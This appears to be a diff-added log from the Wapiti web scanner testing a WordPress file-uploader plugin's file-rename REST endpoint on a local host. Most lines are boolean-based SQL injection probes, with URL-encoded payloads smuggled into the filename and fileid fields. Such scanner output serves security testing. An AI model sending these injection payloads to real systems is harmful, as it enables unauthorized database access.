+2024-03-21 15:30:24.658 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%22%29%20AND%2089%3D113%20AND%20%28%2265%22%3D%2265&fileid=45
+2024-03-21 15:30:25.470 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%22%29%20AND%2060%3D131%20AND%20%28%2257%22%3D%2257&fileid=45
+2024-03-21 15:30:26.288 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz%22%29%20AND%2072%3D72%20AND%20%28%2288%22%3D%2288&fileid=45
+2024-03-21 15:30:27.102 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%20AND%2048%3D104%20AND%2032%3D32
+2024-03-21 15:30:27.953 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%20AND%2033%3D85%20AND%2038%3D38
+2024-03-21 15:30:28.792 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%20AND%2016%3D16%20AND%2067%3D67
+2024-03-21 15:30:29.598 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%27%20AND%2085%3D107%20AND%20%2755%27%3D%2755
+2024-03-21 15:30:30.398 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%27%20AND%2023%3D50%20AND%20%2727%27%3D%2727
+2024-03-21 15:30:31.197 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%27%20AND%2073%3D73%20AND%20%2758%27%3D%2758
+2024-03-21 15:30:31.990 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%22%20AND%2091%3D128%20AND%20%2238%22%3D%2238
+2024-03-21 15:30:32.787 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%22%20AND%2026%3D108%20AND%20%2251%22%3D%2251
+2024-03-21 15:30:33.579 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%22%20AND%2068%3D68%20AND%20%2253%22%3D%2253
+2024-03-21 15:30:34.374 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%29%20AND%2055%3D151%20AND%20%2823%3D23
+2024-03-21 15:30:35.180 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%29%20AND%2026%3D57%20AND%20%2837%3D37
+2024-03-21 15:30:35.993 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%29%20AND%2088%3D88%20AND%20%2828%3D28
+2024-03-21 15:30:36.789 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%27%29%20AND%2072%3D96%20AND%20%28%2729%27%3D%2729
+2024-03-21 15:30:37.588 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%27%29%20AND%2072%3D121%20AND%20%28%2765%27%3D%2765
+2024-03-21 15:30:38.406 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%27%29%20AND%2063%3D63%20AND%20%28%2786%27%3D%2786
+2024-03-21 15:30:39.204 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%22%29%20AND%2021%3D82%20AND%20%28%2252%22%3D%2252
+2024-03-21 15:30:40.067 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%22%29%20AND%2073%3D170%20AND%20%28%2262%22%3D%2262
+2024-03-21 15:30:40.878 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45%22%29%20AND%2015%3D15%20AND%20%28%2285%22%3D%2285
+2024-03-21 15:30:41.702 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-21 15:30:41.735 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-21 15:30:41.767 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-21 15:30:41.798 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-21 15:30:41.819 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//nmedia-user-file-uploader.json/
+2024-03-21 15:30:41.820 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//nmedia-user-file-uploader.json/web_03212024_1526.html with a browser to see this report.
